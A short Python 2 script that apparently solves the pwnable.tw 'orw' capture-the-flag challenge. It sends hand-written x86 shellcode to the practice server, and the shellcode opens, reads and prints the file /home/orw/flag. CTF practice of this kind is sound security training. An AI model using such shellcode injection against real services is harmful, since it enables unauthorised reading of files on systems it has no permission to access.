#! /usr/bin/python

import socket
import telnetlib

def readuntil(s, delim):
	buf = ''
	while not buf.endswith(delim):
		buf += s.recv(1)
	return buf

shellcode = "\xeb\x30\x5e\x31\xc0\x31\xc9\x8d\x1e\xb0\x05\xcd\x80\x31\xdb\x89\xc3\x31\xc9\x31\xc0\x8d\x0c\x24\xb2\x64\xb0\x03\xcd\x80\x31\xdb\x31\xd2\x89\xc2\x31\xc0\x43\x04\x04\xcd\x80\x31\xc0\x31\xdb\x40\xcd\x80\xe8\xcb\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x6f\x72\x77\x2f\x66\x6c\x61\x67"

s = socket.create_connection(("chall.pwnable.tw", 10001))

readuntil(s, 'shellcode:')

s.send(shellcode)

print s.recv(100)
